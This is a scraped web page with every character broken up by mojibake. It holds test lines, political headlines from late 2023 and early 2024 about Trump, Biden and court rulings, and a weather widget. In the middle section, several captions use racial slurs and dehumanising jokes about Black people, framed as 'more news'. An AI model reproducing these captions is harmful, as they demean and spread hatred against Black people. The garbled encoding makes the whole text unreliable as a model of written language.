.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚ÄéT‚Äée‚Äés‚Äét‚Äé ‚Äé2‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé
.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚ÄéT‚Äée‚Äés‚Äét‚Äé ‚Äé3‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé
.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé ‚ÄéT‚Äée‚Äés‚Äét‚Äé ‚Äéc‚Äéo‚Äém‚Äép‚Äél‚Äée‚Äét‚Äée‚Äé.‚Äé

H‚Äée‚Äér‚Äée‚Äé'‚Äés‚Äé ‚Äém‚Äéo‚Äér‚Äée‚Äé ‚Äé""‚Äén‚Äée‚Äéw‚Äés‚Äé.‚Äé""‚Äé

E‚Äéx‚Äéc‚Äél‚Äéu‚Äés‚Äéi‚Äév‚Äée‚Äé‚Äî‚ÄéT‚Äér‚Äéu‚Äém‚Äép‚Äé ‚ÄéT‚Äéo‚Äéu‚Äét‚Äés‚Äé ‚ÄéW‚Äéo‚Äér‚Äél‚Äéd‚Äéw‚Äéi‚Äéd‚Äée‚Äé ‚ÄéP‚Äéo‚Äép‚Äéu‚Äél‚Äéi‚Äés‚Äét‚Äé ‚ÄéV‚Äéi‚Äéc‚Äét‚Äéo‚Äér‚Äéi‚Äée‚Äés‚Äé

‚Äò‚ÄéE‚Äés‚Äés‚Äée‚Äén‚Äét‚Äéi‚Äéa‚Äél‚Äél‚Äéy‚Äé ‚ÄéA‚Äé ‚ÄéM‚ÄéA‚ÄéG‚ÄéA‚Äé-‚ÄéT‚Äér‚Äéu‚Äém‚Äép‚Äé ‚ÄéM‚Äéo‚Äév‚Äée‚Äém‚Äée‚Äén‚Äét‚Äé‚Äô‚Äé

D‚Äée‚Äét‚Äéa‚Äéi‚Äél‚Äés‚Äé:‚Äé ‚ÄéM‚Äéi‚Äél‚Äée‚Äéi‚Äé‚Äô‚Äés‚Äé ‚Äée‚Äél‚Äée‚Äéc‚Äét‚Äéi‚Äéo‚Äén‚Äé ‚Äén‚Äéi‚Äég‚Äéh‚Äét‚Äé ‚Äéc‚Äéa‚Äél‚Äél‚Äé ‚Äét‚Äéo‚Äé ‚ÄéT‚Äér‚Äéu‚Äém‚Äép‚Äé
F‚Äéo‚Äér‚Äém‚Äée‚Äér‚Äé ‚ÄéP‚Äér‚Äée‚Äés‚Äéi‚Äéd‚Äée‚Äén‚Äét‚Äé ‚ÄéD‚Äéo‚Äén‚Äéa‚Äél‚Äéd‚Äé ‚ÄéT‚Äér‚Äéu‚Äém‚Äép‚Äé ‚Äér‚Äée‚Äéa‚Äéc‚Äét‚Äés‚Äé ‚Äét‚Äéo‚Äé ‚Äés‚Äéu‚Äép‚Äép‚Äéo‚Äér‚Äét‚Äée‚Äér‚Äés‚Äé ‚Äéd‚Äéu‚Äér‚Äéi‚Äén‚Äég‚Äé ‚Äéa‚Äé ‚Äéc‚Äéo‚Äém‚Äém‚Äéi‚Äét‚Äé ‚Äét‚Äéo‚Äé ‚Äéc‚Äéa‚Äéu‚Äéc‚Äéu‚Äés‚Äé ‚Äér‚Äéa‚Äél‚Äél‚Äéy‚Äé,‚Äé ‚ÄéT‚Äéu‚Äée‚Äés‚Äéd‚Äéa‚Äéy‚Äé,‚Äé ‚ÄéD‚Äée‚Äéc‚Äé.‚Äé ‚Äé1‚Äé9‚Äé,‚Äé ‚Äé2‚Äé0‚Äé2‚Äé3‚Äé,‚Äé ‚Äéi‚Äén‚Äé ‚ÄéW‚Äéa‚Äét‚Äée‚Äér‚Äél‚Äéo‚Äéo‚Äé,‚Äé ‚ÄéI‚Äéo‚Äéw‚Äéa‚Äé.‚Äé ‚ÄéA‚Äén‚Äé ‚Äéa‚Äép‚Äép‚Äée‚Äéa‚Äél‚Äés‚Äé ‚Äéc‚Äéo‚Äéu‚Äér‚Äét‚Äé ‚Äés‚Äéa‚Äéi‚Äéd‚Äé ‚ÄéT‚Äéu‚Äée‚Äés‚Äéd‚Äéa‚Äéy‚Äé,‚Äé ‚ÄéJ‚Äéa‚Äén‚Äé.‚Äé ‚Äé2‚Äé,‚Äé ‚Äé2‚Äé0‚Äé2‚Äé4‚Äé,‚Äé ‚Äét‚Äéh‚Äéa‚Äét‚Äé ‚ÄéM‚Äéi‚Äéc‚Äéh‚Äéa‚Äée‚Äél‚Äé ‚ÄéC‚Äéo‚Äéh‚Äée‚Äén‚Äé ‚Äéc‚Äéa‚Äén‚Äé'‚Äét‚Äé ‚Äéh‚Äéo‚Äél‚Äéd‚Äé ‚ÄéT‚Äér‚Äéu‚Äém‚Äép‚Äé,‚Äé ‚Äéh‚Äéi‚Äés‚Äé ‚Äéf‚Äéo‚Äér‚Äém‚Äée‚Äér‚Äé ‚Äéb‚Äéo‚Äés‚Äés‚Äé,‚Äé ‚Äél‚Äéi‚Äéa‚Äéb‚Äél‚Äée‚Äé ‚Äéf‚Äéo‚Äér‚Äé ‚Äéa‚Äél‚Äél‚Äée‚Äég‚Äée‚Äéd‚Äél‚Äéy‚Äé ‚Äéj‚Äéa‚Äéi‚Äél‚Äéi‚Äén‚Äég‚Äé ‚Äéh‚Äéi‚Äém‚Äé ‚Äéi‚Äén‚Äé ‚Äér‚Äée‚Äét‚Äéa‚Äél‚Äéi‚Äéa‚Äét‚Äéi‚Äéo‚Äén‚Äé ‚Äéf‚Äéo‚Äér‚Äé ‚Äéw‚Äér‚Äéi‚Äét‚Äéi‚Äén‚Äég‚Äé ‚Äéa‚Äé ‚Äét‚Äée‚Äél‚Äél‚Äé-‚Äéa‚Äél‚Äél‚Äé ‚Äém‚Äée‚Äém‚Äéo‚Äéi‚Äér‚Äé.‚Äé ‚Äé(‚ÄéA‚ÄéP‚Äé ‚Äé‚Ä¶‚Äé
D‚Äéo‚Äén‚Äéa‚Äél‚Äéd‚Äé ‚ÄéT‚Äér‚Äéu‚Äém‚Äép‚Äé ‚Äét‚Äéo‚Äél‚Äéd‚Äé ‚ÄéB‚Äér‚Äée‚Äéi‚Äét‚Äéb‚Äéa‚Äér‚Äét‚Äé ‚ÄéN‚Äée‚Äéw‚Äés‚Äé ‚Äét‚Äéh‚Äéa‚Äét‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äér‚Äée‚Äéc‚Äée‚Äén‚Äét‚Äé ‚Äéw‚Äéa‚Äév‚Äée‚Äé ‚Äéo‚Äéf‚Äé ‚Äép‚Äéo‚Äép‚Äéu‚Äél‚Äéi‚Äés‚Äét‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äéc‚Äéo‚Äén‚Äés‚Äée‚Äér‚Äév‚Äéa‚Äét‚Äéi‚Äév‚Äée‚Äé ‚Äév‚Äéi‚Äéc‚Äét‚Äéo‚Äér‚Äéi‚Äée‚Äés‚Äé,‚Äé ‚Äéf‚Äér‚Äéo‚Äém‚Äé ‚ÄéI‚Äét‚Äéa‚Äél‚Äéy‚Äé ‚Äét‚Äéo‚Äé ‚ÄéA‚Äér‚Äég‚Äée‚Äén‚Äét‚Äéi‚Äén‚Äéa‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äém‚Äéo‚Äér‚Äée‚Äé,‚Äé ‚Äés‚Äéh‚Äéo‚Äéw‚Äé ‚Äét‚Äéh‚Äéa‚Äét‚Äé ‚Äéi‚Äén‚Äét‚Äée‚Äér‚Äén‚Äéa‚Äét‚Äéi‚Äéo‚Äén‚Äéa‚Äél‚Äé ‚Äép‚Äéo‚Äép‚Äéu‚Äél‚Äéi‚Äés‚Äét‚Äé ‚Äéc‚Äéo‚Äén‚Äés‚Äée‚Äér‚Äév‚Äéa‚Äét‚Äéi‚Äév‚Äée‚Äés‚Äé‚Äô‚Äé ‚Äém‚Äéo‚Äév‚Äée‚Äém‚Äée‚Äén‚Äét‚Äé ‚Äéi‚Äés‚Äé ‚Äé‚Äú‚Äés‚Äét‚Äér‚Äéo‚Äén‚Äég‚Äée‚Äér‚Äé‚Äù‚Äé ‚Äét‚Äéh‚Äéa‚Äén‚Äé ‚Äéi‚Äét‚Äé ‚Äéw‚Äéa‚Äés‚Äé ‚Äéi‚Äén‚Äé ‚Äé2‚Äé0‚Äé1‚Äé6‚Äé.‚Äé

S‚ÄéC‚ÄéO‚ÄéT‚ÄéU‚ÄéS‚Äé ‚ÄéB‚Äél‚Äéo‚Äéc‚Äék‚Äés‚Äé ‚ÄéB‚Äéi‚Äéd‚Äée‚Äén‚Äé ‚ÄéA‚Äéd‚Äém‚Äéi‚Äén‚Äé'‚Äés‚Äé ‚ÄéE‚ÄéR‚Äé ‚ÄéD‚Äéo‚Äéc‚Äét‚Äéo‚Äér‚Äé ‚ÄéA‚Äéb‚Äéo‚Äér‚Äét‚Äéi‚Äéo‚Äén‚Äé ‚ÄéR‚Äéu‚Äél‚Äée‚Äé ‚Äéi‚Äén‚Äé ‚ÄéI‚Äéd‚Äéa‚Äéh‚Äéo‚Äé
S‚ÄéC‚ÄéO‚ÄéT‚ÄéU‚ÄéS‚Äé ‚ÄéB‚Äél‚Äéo‚Äéc‚Äék‚Äés‚Äé ‚ÄéB‚Äéi‚Äéd‚Äée‚Äén‚Äé ‚ÄéA‚Äéd‚Äém‚Äéi‚Äén‚Äé'‚Äés‚Äé ‚ÄéE‚ÄéR‚Äé ‚ÄéD‚Äéo‚Äéc‚Äét‚Äéo‚Äér‚Äé ‚ÄéA‚Äéb‚Äéo‚Äér‚Äét‚Äéi‚Äéo‚Äén‚Äé ‚ÄéR‚Äéu‚Äél‚Äée‚Äé ‚Äéi‚Äén‚Äé ‚ÄéI‚Äéd‚Äéa‚Äéh‚Äéo‚Äé
4‚Äé,‚Äé3‚Äé0‚Äé8‚Äé
B‚Äéi‚Äéd‚Äée‚Äén‚Äé'‚Äés‚Äé ‚ÄéN‚Äéa‚Äét‚Äéi‚Äéo‚Äén‚Äéa‚Äél‚Äé ‚ÄéP‚Äéa‚Äér‚Äék‚Äé ‚ÄéS‚Äée‚Äér‚Äév‚Äéi‚Äéc‚Äée‚Äé ‚Äét‚Äéo‚Äé ‚ÄéR‚Äée‚Äém‚Äéo‚Äév‚Äée‚Äé ‚ÄéW‚Äéi‚Äél‚Äél‚Äéi‚Äéa‚Äém‚Äé ‚ÄéP‚Äée‚Äén‚Äén‚Äé ‚ÄéS‚Äét‚Äéa‚Äét‚Äéu‚Äée‚Äé ‚Äéi‚Äén‚Äé ‚ÄéP‚Äéh‚Äéi‚Äél‚Äéa‚Äéd‚Äée‚Äél‚Äép‚Äéh‚Äéi‚Äéa‚Äé
B‚Äéi‚Äéd‚Äée‚Äén‚Äé'‚Äés‚Äé ‚ÄéN‚Äéa‚Äét‚Äéi‚Äéo‚Äén‚Äéa‚Äél‚Äé ‚ÄéP‚Äéa‚Äér‚Äék‚Äé ‚ÄéS‚Äée‚Äér‚Äév‚Äéi‚Äéc‚Äée‚Äé ‚Äét‚Äéo‚Äé ‚ÄéR‚Äée‚Äém‚Äéo‚Äév‚Äée‚Äé ‚ÄéW‚Äéi‚Äél‚Äél‚Äéi‚Äéa‚Äém‚Äé ‚ÄéP‚Äée‚Äén‚Äén‚Äé ‚ÄéS‚Äét‚Äéa‚Äét‚Äéu‚Äée‚Äé ‚Äéi‚Äén‚Äé ‚ÄéP‚Äéh‚Äéi‚Äél‚Äéa‚Äéd‚Äée‚Äél‚Äép‚Äéh‚Äéi‚Äéa‚Äé
1‚Äé,‚Äé0‚Äé5‚Äé1‚Äé

N‚Äéo‚Äél‚Äét‚Äée‚Äé:‚Äé ‚Äé‚Äò‚ÄéE‚Äéx‚Äéi‚Äés‚Äét‚Äée‚Äén‚Äét‚Äéi‚Äéa‚Äél‚Äé ‚ÄéC‚Äér‚Äéi‚Äés‚Äéi‚Äés‚Äé‚Äô‚Äé ‚Äéa‚Äés‚Äé ‚ÄéW‚Äéo‚Äék‚Äée‚Äé ‚ÄéH‚Äéo‚Äél‚Äél‚Äéy‚Äéw‚Äéo‚Äéo‚Äéd‚Äé ‚ÄéL‚Äéo‚Äés‚Äée‚Äés‚Äé ‚Äé2‚Äé0‚Äé%‚Äé ‚Äéo‚Äéf‚Äé ‚ÄéM‚Äéo‚Äév‚Äéi‚Äée‚Äég‚Äéo‚Äée‚Äér‚Äés‚Äé
7‚Äé3‚Äé1‚Äé
G‚Äéo‚Äél‚Äéd‚Äée‚Äén‚Äé ‚ÄéG‚Äél‚Äéo‚Äéb‚Äée‚Äés‚Äé ‚ÄéH‚Äéo‚Äés‚Äét‚Äé ‚ÄéJ‚Äéo‚Äé ‚ÄéK‚Äéo‚Äéy‚Äé ‚ÄéO‚Äép‚Äée‚Äén‚Äéi‚Äén‚Äég‚Äé ‚ÄéM‚Äéo‚Äén‚Äéo‚Äél‚Äéo‚Äég‚Äéu‚Äée‚Äé ‚ÄéT‚Äér‚Äéa‚Äés‚Äéh‚Äée‚Äéd‚Äé ‚Äéb‚Äéy‚Äé ‚ÄéV‚Äéi‚Äée‚Äéw‚Äée‚Äér‚Äés‚Äé
G‚Äéo‚Äél‚Äéd‚Äée‚Äén‚Äé ‚ÄéG‚Äél‚Äéo‚Äéb‚Äée‚Äés‚Äé ‚ÄéH‚Äéo‚Äés‚Äét‚Äé ‚ÄéJ‚Äéo‚Äé ‚ÄéK‚Äéo‚Äéy‚Äé ‚ÄéO‚Äép‚Äée‚Äén‚Äéi‚Äén‚Äég‚Äé ‚ÄéM‚Äéo‚Äén‚Äéo‚Äél‚Äéo‚Äég‚Äéu‚Äée‚Äé ‚ÄéT‚Äér‚Äéa‚Äés‚Äéh‚Äée‚Äéd‚Äé ‚Äéb‚Äéy‚Äé ‚ÄéV‚Äéi‚Äée‚Äéw‚Äée‚Äér‚Äés‚Äé
1‚Äé8‚Äé3‚Äé
T‚Äér‚Äée‚Äén‚Äét‚Äé ‚ÄéS‚Äét‚Äéa‚Äég‚Äég‚Äés‚Äé ‚ÄéW‚Äéa‚Äér‚Äén‚Äés‚Äé ‚Äé'‚ÄéM‚Äéi‚Äét‚Äét‚Äé ‚ÄéR‚Äéo‚Äém‚Äén‚Äée‚Äéy‚Äé ‚ÄéI‚Äés‚Äé ‚ÄéS‚Äét‚Äéi‚Äél‚Äél‚Äé ‚Äéo‚Äén‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚ÄéB‚Äéa‚Äél‚Äél‚Äéo‚Äét‚Äé'‚Äé ‚Äéi‚Äén‚Äé ‚ÄéU‚ÄéT‚Äé ‚ÄéS‚Äée‚Äén‚Äéa‚Äét‚Äée‚Äé ‚ÄéR‚Äéa‚Äéc‚Äée‚Äé
T‚Äér‚Äée‚Äén‚Äét‚Äé ‚ÄéS‚Äét‚Äéa‚Äég‚Äég‚Äés‚Äé ‚ÄéW‚Äéa‚Äér‚Äén‚Äés‚Äé ‚Äé'‚ÄéM‚Äéi‚Äét‚Äét‚Äé ‚ÄéR‚Äéo‚Äém‚Äén‚Äée‚Äéy‚Äé ‚ÄéI‚Äés‚Äé ‚ÄéS‚Äét‚Äéi‚Äél‚Äél‚Äé ‚Äéo‚Äén‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚ÄéB‚Äéa‚Äél‚Äél‚Äéo‚Äét‚Äé'‚Äé ‚Äéi‚Äén‚Äé ‚ÄéU‚ÄéT‚Äé ‚ÄéS‚Äée‚Äén‚Äéa‚Äét‚Äée‚Äé ‚ÄéR‚Äéa‚Äéc‚Äée‚Äé
7‚Äé2‚Äé
B‚Äéi‚Äéd‚Äée‚Äén‚Äé ‚ÄéC‚Äéa‚Äém‚Äép‚Äéa‚Äéi‚Äég‚Äén‚Äé:‚Äé ‚ÄéR‚Äée‚Äés‚Äét‚Äéo‚Äér‚Äéi‚Äén‚Äég‚Äé ‚ÄéR‚Äéo‚Äée‚Äé ‚ÄéT‚Äéo‚Äép‚Äé ‚ÄéP‚Äér‚Äéi‚Äéo‚Äér‚Äéi‚Äét‚Äéy‚Äé ‚Äéo‚Äén‚Äé ‚ÄéD‚Äéa‚Äéy‚Äé ‚Äé1‚Äé ‚Äéo‚Äéf‚Äé ‚Äé2‚Äén‚Äéd‚Äé ‚ÄéT‚Äée‚Äér‚Äém‚Äé
B‚Äéi‚Äéd‚Äée‚Äén‚Äé ‚ÄéC‚Äéa‚Äém‚Äép‚Äéa‚Äéi‚Äég‚Äén‚Äé:‚Äé ‚ÄéR‚Äée‚Äés‚Äét‚Äéo‚Äér‚Äéi‚Äén‚Äég‚Äé ‚ÄéR‚Äéo‚Äée‚Äé ‚ÄéT‚Äéo‚Äép‚Äé ‚ÄéP‚Äér‚Äéi‚Äéo‚Äér‚Äéi‚Äét‚Äéy‚Äé ‚Äéo‚Äén‚Äé ‚ÄéD‚Äéa‚Äéy‚Äé ‚Äé1‚Äé ‚Äéo‚Äéf‚Äé ‚Äé2‚Äén‚Äéd‚Äé ‚ÄéT‚Äée‚Äér‚Äém‚Äé
2‚Äé,‚Äé7‚Äé5‚Äé1‚Äé
R‚Äée‚Äép‚Äéo‚Äér‚Äét‚Äé:‚Äé ‚ÄéI‚ÄéD‚ÄéF‚Äé ‚ÄéK‚Äéi‚Äél‚Äél‚Äés‚Äé ‚ÄéA‚Äél‚Äé ‚ÄéJ‚Äéa‚Äéz‚Äée‚Äée‚Äér‚Äéa‚Äé ‚ÄéJ‚Äéo‚Äéu‚Äér‚Äén‚Äéa‚Äél‚Äéi‚Äés‚Äét‚Äé ‚ÄéW‚Äéh‚Äéo‚Äé ‚ÄéW‚Äéa‚Äés‚Äé ‚ÄéR‚Äéi‚Äéd‚Äéi‚Äén‚Äég‚Äé ‚Äéw‚Äéi‚Äét‚Äéh‚Äé ‚ÄéH‚Äéa‚Äém‚Äéa‚Äés‚Äé ‚ÄéT‚Äée‚Äér‚Äér‚Äéo‚Äér‚Äéi‚Äés‚Äét‚Äé
R‚Äée‚Äép‚Äéo‚Äér‚Äét‚Äé:‚Äé ‚ÄéI‚ÄéD‚ÄéF‚Äé ‚ÄéK‚Äéi‚Äél‚Äél‚Äés‚Äé ‚ÄéA‚Äél‚Äé ‚ÄéJ‚Äéa‚Äéz‚Äée‚Äée‚Äér‚Äéa‚Äé ‚ÄéJ‚Äéo‚Äéu‚Äér‚Äén‚Äéa‚Äél‚Äéi‚Äés‚Äét‚Äé ‚ÄéW‚Äéh‚Äéo‚Äé ‚ÄéW‚Äéa‚Äés‚Äé ‚ÄéR‚Äéi‚Äéd‚Äéi‚Äén‚Äég‚Äé ‚Äéw‚Äéi‚Äét‚Äéh‚Äé ‚ÄéH‚Äéa‚Äém‚Äéa‚Äés‚Äé ‚ÄéT‚Äée‚Äér‚Äér‚Äéo‚Äér‚Äéi‚Äés‚Äét‚Äé
1‚Äé6‚Äé3‚Äé
E‚Äéx‚Äéc‚Äél‚Äéu‚Äés‚Äéi‚Äév‚Äée‚Äé-‚Äé-‚ÄéT‚Äér‚Äéu‚Äém‚Äép‚Äé ‚Äéo‚Äén‚Äé ‚ÄéM‚Äéi‚Äél‚Äée‚Äéi‚Äé,‚Äé ‚ÄéI‚Äén‚Äét‚Äée‚Äér‚Äén‚Äéa‚Äét‚Äéi‚Äéo‚Äén‚Äéa‚Äél‚Äé ‚ÄéP‚Äéo‚Äép‚Äéu‚Äél‚Äéi‚Äés‚Äét‚Äé ‚ÄéW‚Äéi‚Äén‚Äés‚Äé:‚Äé ‚Äé'‚ÄéS‚Äét‚Äér‚Äéo‚Äén‚Äég‚Äée‚Äér‚Äé'‚Äé ‚Äét‚Äéh‚Äéa‚Äén‚Äé ‚Äé'‚Äé1‚Äé6‚Äé
E‚Äéx‚Äéc‚Äél‚Äéu‚Äés‚Äéi‚Äév‚Äée‚Äé-‚Äé-‚ÄéT‚Äér‚Äéu‚Äém‚Äép‚Äé ‚Äéo‚Äén‚Äé ‚ÄéM‚Äéi‚Äél‚Äée‚Äéi‚Äé,‚Äé ‚ÄéI‚Äén‚Äét‚Äée‚Äér‚Äén‚Äéa‚Äét‚Äéi‚Äéo‚Äén‚Äéa‚Äél‚Äé ‚ÄéP‚Äéo‚Äép‚Äéu‚Äél‚Äéi‚Äés‚Äét‚Äé ‚ÄéW‚Äéi‚Äén‚Äés‚Äé:‚Äé ‚Äé'‚ÄéS‚Äét‚Äér‚Äéo‚Äén‚Äég‚Äée‚Äér‚Äé'‚Äé ‚Äét‚Äéh‚Äéa‚Äén‚Äé ‚Äé'‚Äé1‚Äé6‚Äé
3‚Äé,‚Äé9‚Äé4‚Äé8‚Äé
C‚Äéh‚Äée‚Äén‚Äée‚Äéy‚Äé:‚Äé ‚ÄéT‚Äér‚Äéu‚Äém‚Äép‚Äé ‚Äé'‚ÄéO‚Äéu‚Äég‚Äéh‚Äét‚Äé ‚Äét‚Äéo‚Äé ‚ÄéB‚Äée‚Äé ‚ÄéD‚Äéi‚Äés‚Äéq‚Äéu‚Äéa‚Äél‚Äéi‚Äéf‚Äéi‚Äée‚Äéd‚Äé ‚Äéf‚Äér‚Äéo‚Äém‚Äé ‚ÄéH‚Äéo‚Äél‚Äéd‚Äéi‚Äén‚Äég‚Äé ‚ÄéO‚Äéf‚Äéf‚Äéi‚Äéc‚Äée‚Äé ‚Äéi‚Äén‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚ÄéF‚Äéu‚Äét‚Äéu‚Äér‚Äée‚Äé'‚Äé
C‚Äéh‚Äée‚Äén‚Äée‚Äéy‚Äé:‚Äé ‚ÄéT‚Äér‚Äéu‚Äém‚Äép‚Äé ‚Äé'‚ÄéO‚Äéu‚Äég‚Äéh‚Äét‚Äé ‚Äét‚Äéo‚Äé ‚ÄéB‚Äée‚Äé ‚ÄéD‚Äéi‚Äés‚Äéq‚Äéu‚Äéa‚Äél‚Äéi‚Äéf‚Äéi‚Äée‚Äéd‚Äé ‚Äéf‚Äér‚Äéo‚Äém‚Äé ‚ÄéH‚Äéo‚Äél‚Äéd‚Äéi‚Äén‚Äég‚Äé ‚ÄéO‚Äéf‚Äéf‚Äéi‚Äéc‚Äée‚Äé ‚Äéi‚Äén‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚ÄéF‚Äéu‚Äét‚Äéu‚Äér‚Äée‚Äé'‚Äé

2‚Äé ‚ÄéB‚Äéo‚Äén‚Äég‚Äéo‚Äé ‚ÄéB‚Äée‚Äéa‚Äét‚Äéi‚Äén‚Äég‚Äé ‚ÄéN‚Äéi‚Äég‚Äég‚Äéa‚Äés‚Äé ‚ÄéB‚Äéu‚Äés‚Äét‚Äée‚Äéd‚Äé ‚Äéf‚Äéo‚Äér‚Äé ‚ÄéS‚Äéh‚Äéo‚Äéo‚Äét‚Äéi‚Äén‚Äég‚Äé ‚Äéa‚Äét‚Äé ‚ÄéT‚Äér‚Äée‚Äén‚Äét‚Äéo‚Äén‚Äé ‚ÄéA‚Äél‚Äél‚Äé ‚ÄéN‚Äéi‚Äég‚Äéh‚Äét‚Äé ‚ÄéF‚Äée‚Äés‚Äét‚Äéi‚Äév‚Äéa‚Äél‚Äé.‚Äé

G‚Äéo‚Äét‚Äé ‚Äéa‚Äé ‚Äél‚Äéi‚Äét‚Äét‚Äél‚Äée‚Äé ‚Äét‚Äéo‚Äéo‚Äé ‚Äéf‚Äée‚Äés‚Äét‚Äéi‚Äév‚Äée‚Äé ‚Äét‚Äéh‚Äée‚Äér‚Äée‚Äé,‚Äé ‚Äén‚Äée‚Äég‚Äér‚Äéo‚Äée‚Äés‚Äé.‚Äé


P‚Äéa‚Äéc‚Äék‚Äé ‚Äéo‚Äéf‚Äé ‚ÄéN‚Äéi‚Äég‚Äég‚Äée‚Äér‚Äés‚Äé ‚ÄéR‚Äéa‚Äéi‚Äéd‚Äé ‚ÄéW‚Äéi‚Äél‚Äém‚Äéi‚Äén‚Äég‚Äét‚Äéo‚Äén‚Äé ‚ÄéD‚Äéo‚Äél‚Äél‚Äéa‚Äér‚Äé ‚ÄéS‚Äét‚Äéo‚Äér‚Äée‚Äé.‚Äé


S‚Äép‚Äéi‚Äéc‚Äé ‚ÄéN‚ÄéY‚ÄéP‚ÄéD‚Äé ‚ÄéC‚Äéo‚Äép‚Äé ‚ÄéA‚Äér‚Äér‚Äée‚Äés‚Äét‚Äée‚Äéd‚Äé ‚Äéf‚Äéo‚Äér‚Äé ‚ÄéS‚Äéo‚Äél‚Äéi‚Äéc‚Äéi‚Äét‚Äéi‚Äén‚Äég‚Äé ‚ÄéS‚Äée‚Äéx‚Äé ‚Äéf‚Äéo‚Äér‚Äé ‚ÄéC‚Äél‚Äéa‚Äés‚Äés‚Äéi‚Äéf‚Äéi‚Äée‚Äéd‚Äé ‚ÄéI‚Äén‚Äéf‚Äéo‚Äér‚Äém‚Äéa‚Äét‚Äéi‚Äéo‚Äén‚Äé.‚Äé


V‚Äéi‚Äéc‚Äét‚Äéi‚Äém‚Äés‚Äé ‚ÄéG‚Äée‚Äét‚Äé ‚Äé$‚Äé2‚Äé7‚Äé ‚ÄéM‚Äéi‚Äél‚Äé.‚Äé ‚ÄéS‚Äée‚Äét‚Äét‚Äél‚Äée‚Äém‚Äée‚Äén‚Äét‚Äé ‚ÄéA‚Äéf‚Äét‚Äée‚Äér‚Äé ‚ÄéS‚Äép‚Äéi‚Äéc‚Äé ‚ÄéF‚Äéa‚Äég‚Äé ‚ÄéR‚Äéa‚Äép‚Äée‚Äéd‚Äé ‚Äéa‚Äé ‚ÄéB‚Äéu‚Äén‚Äéc‚Äéh‚Äé ‚Äéo‚Äéf‚Äé ‚ÄéY‚Äéo‚Äéu‚Äén‚Äég‚Äé ‚ÄéB‚Äéo‚Äéy‚Äés‚Äé ‚Äéa‚Äét‚Äé ‚ÄéC‚Äél‚Äéi‚Äén‚Äét‚Äéo‚Äén‚Äé ‚ÄéH‚Äéi‚Äél‚Äél‚Äé ‚ÄéC‚Äéh‚Äéu‚Äér‚Äéc‚Äéh‚Äé.‚Äé

.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé ‚ÄéW‚Äée‚Äéa‚Äét‚Äéh‚Äée‚Äér‚Äé.‚Äé

T‚Äéo‚Äéd‚Äéa‚Äéy‚Äé
P‚Äéa‚Äér‚Äét‚Äél‚Äéy‚Äé ‚ÄéC‚Äél‚Äéo‚Äéu‚Äéd‚Äéy‚Äé
6‚Äé5‚Äé¬∞‚Äé
/‚Äé5‚Äé3‚Äé¬∞‚Äé
2‚Äé%‚Äé
S‚ÄéE‚Äé ‚Äé1‚Äé4‚Äé ‚Äém‚Äép‚Äéh‚Äé
S‚Äéu‚Äén‚Äé ‚Äé0‚Äé7‚Äé ‚Äé|‚Äé ‚ÄéD‚Äéa‚Äéy‚Äé
6‚Äé5‚Äé¬∞‚Äé
2‚Äé%‚Äé
S‚ÄéE‚Äé
1‚Äé4‚Äé
 ‚Äé
m‚Äép‚Äéh‚Äé
P‚Äéa‚Äér‚Äét‚Äél‚Äéy‚Äé ‚Äéc‚Äél‚Äéo‚Äéu‚Äéd‚Äéy‚Äé.‚Äé ‚ÄéH‚Äéi‚Äég‚Äéh‚Äé ‚Äéa‚Äér‚Äéo‚Äéu‚Äén‚Äéd‚Äé ‚Äé6‚Äé5‚ÄéF‚Äé.‚Äé ‚ÄéW‚Äéi‚Äén‚Äéd‚Äés‚Äé ‚ÄéS‚ÄéE‚Äé ‚Äéa‚Äét‚Äé ‚Äé1‚Äé0‚Äé ‚Äét‚Äéo‚Äé ‚Äé2‚Äé0‚Äé ‚Äém‚Äép‚Äéh‚Äé.‚Äé
 ‚Äé
H‚Äéu‚Äém‚Äéi‚Äéd‚Äéi‚Äét‚Äéy‚Äé
5‚Äé8‚Äé%‚Äé
U‚ÄéV‚Äé ‚ÄéI‚Äén‚Äéd‚Äée‚Äéx‚Äé
3‚Äé ‚Äéo‚Äéf‚Äé ‚Äé1‚Äé1‚Äé
S‚Äéu‚Äén‚Äér‚Äéi‚Äés‚Äée‚Äé
7‚Äé:‚Äé2‚Äé7‚Äé ‚Äéa‚Äém‚Äé
S‚Äéu‚Äén‚Äés‚Äée‚Äét‚Äé
5‚Äé:‚Äé4‚Äé6‚Äé ‚Äép‚Äém‚Äé
S‚Äéu‚Äén‚Äé ‚Äé0‚Äé7‚Äé ‚Äé|‚Äé ‚ÄéN‚Äéi‚Äég‚Äéh‚Äét‚Äé
5‚Äé3‚Äé¬∞‚Äé
8‚Äé7‚Äé%‚Äé
S‚ÄéE‚Äé
1‚Äé5‚Äé
 ‚Äé
m‚Äép‚Äéh‚Äé
